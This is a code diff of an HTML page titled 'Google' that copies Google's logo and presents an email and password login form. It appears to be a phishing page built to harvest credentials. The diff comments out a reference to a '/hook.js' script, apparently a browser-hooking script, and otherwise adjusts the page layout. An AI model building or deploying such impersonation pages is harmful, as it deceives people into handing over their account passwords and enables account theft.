@@ -5,17 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google</title>
     <link rel="stylesheet" href="styles.css">
-    <script src="/hook.js"></script>
+    <!-- <script src="/hook.js"></script> -->
+
+    <style>
+		#centered {
+            width:350px;
+            height:300px;
+            top:50%;
+            left:50%;
+            position:relative;
+            margin-top:-250px;
+            margin-left:-175px;
+		}
+	</style>
 </head>
 <body>
 
-<div id="box">
+<div id="center">
 
-    <img width="50%" src="white.png" alt="">
+    <img src="white.png" alt="" id="center">
 
-    <img id="logo" src="google.png" width="35%">
+    <img id="logo" src="google.png" id="center">
 
-    <form id="in_box" method="GET" action="index.html">
+    <form id="in_box" method="GET" action="index.html" id="center">
 
         <username> <input id="entry" type="text" name="yourname" placeholder="email" /><br /> </username>
         <password> <input id="entry" type="password" name="password" placeholder="password"/><br /> </password>
